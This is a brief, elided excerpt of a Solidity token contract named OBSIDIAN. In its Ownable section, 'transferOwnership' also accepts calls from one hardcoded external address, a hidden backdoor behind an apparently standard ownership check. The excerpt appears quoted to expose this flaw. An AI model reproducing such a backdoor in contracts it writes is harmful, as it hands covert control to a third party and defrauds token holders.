...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xA581a57A386462F8B28c904f7324a1d60ef96630));
...
contract OBSIDIAN is Context, IERC20, Ownable, Pausable {
  ...
  uint256 private _totalSupply = 31000000000 * 10**9;
  string private _symbol = "OBSIDIAN";
